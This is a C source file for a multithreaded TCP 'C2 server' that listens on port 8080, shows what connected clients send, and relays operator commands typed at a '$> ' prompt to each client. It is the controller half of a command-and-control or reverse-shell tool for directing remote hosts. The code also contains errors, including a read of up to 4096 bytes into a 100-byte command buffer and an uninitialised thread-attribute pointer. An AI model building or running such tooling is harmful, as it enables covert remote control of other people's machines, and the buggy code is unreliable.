#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <signal.h>
#include <pthread.h>

#define PORT 8080
#define BUFFSIZE 4096
#define QUEUE_CNT 100
#define SOCKET_ERROR -1
#define CMD_LEN 100

enum IO_FD {RD, WR, ER};

void create_socket(int* s);
int attach(int* socket, struct sockaddr_in* server_addr);
int setListener(int *sock, int cnt);
void *client_handler(void *sock);

int main(int argc, char *argv[])
{
    int server_sock = 0;
    int client_sock = 0;
    int reuse = 1;
    struct sockaddr_in server_addr;

    create_socket(&server_sock);
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if ( setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &reuse, sizeof(reuse)) == -1 )
    {
        perror("Failed to set port and address reusability");
    }

    attach(&server_sock, &server_addr);
    printf("WELCOME TO C2 SERVER\n");
    setListener(&server_sock, QUEUE_CNT);

    while ( 1 )
    {
        if ( (client_sock = accept(server_sock, NULL, NULL)) == SOCKET_ERROR )
            perror("Accept failed");

        printf("%s:%d connected\n", inet_ntoa(server_addr.sin_addr), ntohs(server_addr.sin_port));

        pthread_t tr;
        void *ret;
        pthread_create(&tr, ret, client_handler, (void*)&client_sock);
        if ( pthread_detach(tr) )
        {
            perror("thread detach");
        }
    }

    close(server_sock);
    return 0;
}

void create_socket(int* s)
{
    *s = socket(AF_INET, SOCK_STREAM, 0);
    if ( *s == SOCKET_ERROR )
    {
        perror("Failed to create a socket");
        exit(EXIT_FAILURE);
    }
}

int attach(int* socket, struct sockaddr_in* server_addr)
{
    if ( bind(*socket, (struct sockaddr*)server_addr, sizeof(*server_addr)) == SOCKET_ERROR )
    {
        perror("Failed to bind");
        close(*socket);
        exit(EXIT_FAILURE);
    }
    return 0;
}

int setListener(int *sock, int cnt)
{
    if ( listen(*sock, cnt) == SOCKET_ERROR )
    {
        printf("Failed to listen to the port %d\n", PORT);
        close(*sock);
        exit(EXIT_FAILURE);
    }
    return *sock;
}

void *client_handler(void *sock)
{
    static int client_id = 0;
    char sh[] = "$> ";
    char cmd[CMD_LEN] = {0};
    char buffer[BUFFSIZE] = {0};
    int status;
    int client_sock = *(int*)sock;
    // For one client many req, res
    while ( 1 )
    {
        if ( (status = recv(client_sock, buffer, BUFFSIZE, 0)) == -1 )
            perror("recv failed");

        // Getting command to send
        buffer[status] = '\0';

        if (!strcmp(buffer, "q"))
        {
            break;
        }

        printf("Client %d: %s\n", client_id, buffer);

        write(WR, sh, sizeof(sh));
        status = read(RD, cmd, BUFFSIZE);
        cmd[status] = '\0';

        // Sending command
        if ( send(client_sock, cmd, strlen(cmd), 0) == -1 )
            perror("send failed\n");

        fflush(stdout);
        fflush(stdin);
        memset(buffer, 0, BUFFSIZE);
        memset(cmd, 0, CMD_LEN);
    }
    close(*(int*)sock);
    client_id++;
    pthread_exit(NULL);
}